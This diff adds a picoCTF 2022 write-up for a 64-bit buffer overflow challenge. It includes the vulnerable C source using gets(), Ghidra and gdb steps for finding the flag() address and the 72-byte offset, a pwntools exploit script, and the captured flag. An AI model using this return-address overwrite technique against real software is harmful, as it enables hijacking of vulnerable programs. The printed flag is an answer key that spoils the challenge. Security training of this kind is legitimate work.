@@ -1,0 +1,126 @@
+#pico2022 #binaryexploitation 
+
+## Challenge:
+```md
+Overflow x64 code
+```
+
+This launches an instance:
+```md
+Overflow x64 code Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the `flag` function in this [program](https://artifacts.picoctf.net/c/192/vuln). [Download source](https://artifacts.picoctf.net/c/192/vuln.c). `nc saturn.picoctf.net 51144`
+```
+
+## Process:
+Download the files.
+```bash
+wget -q https://artifacts.picoctf.net/c/192/vuln
+wget -q https://artifacts.picoctf.net/c/192/vuln.c
+```
+#wget 
+
+Make the *vuln* program executable.
+```bash
+chmod +x vuln
+```
+#chmod 
+
+I opened up the *vuln.c* file in emacs.
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+#define BUFFSIZE 64
+#define FLAGSIZE 64
+
+void flag() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "Please create 'flag.txt' in this directory with your",
+                    "own debugging flag.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFFSIZE];
+  gets(buf);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
+  vuln();
+  return 0;
+}
+```
+#emacs #c 
+
+Next I installed [*ghidra*](https://ghidra-sre.org/). I did this via the *Pop! Shop*.
+
+I opened the file in *ghidra* and found the command after the push.
+![[040_x-sixty-what.png]]
+#ghidra
+
+```
+0040123b
+```
+
+This is also *little endian*.
+
+I run the file in *gdb* and find I need to pass 72 characters before I can cause a segmentation fault.
+```
+gdb vuln
+```
+#gdb 
+
+From here I write a *python* script using *pwntools* to send the payload.
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+payload = b'A'*72 + b'\x3b\x12\x40\x00\x00\x00\x00\x00'
+
+p = remote("saturn.picoctf.net", 51144)
+
+output = p.recvline()
+print(output.decode())
+
+print("Attempting to send payload")
+p.sendline(payload)
+print("Payload sent")
+
+output = p.recv()
+print(output.decode())
+```
+#python #pwntools
+
+Sending this payload returns the flag.
+```
+[+] Opening connection to saturn.picoctf.net on port 65429: Done
+Welcome to 64-bit. Give me a string that gets you the flag:
+
+Attempting to send payload
+Payload sent
+picoCTF{b1663r_15_b3773r_11c407bc}
+[*] Closed connection to saturn.picoctf.net port 65429
+```
+#python #netcat #nc  #pwntools 
+
+Save the flag.
+```bash
+echo "picoCTF{b1663r_15_b3773r_11c407bc}" > flag.txt
+```
+#echo 
+
+**Flag: *picoCTF{b1663r_15_b3773r_11c407bc}***
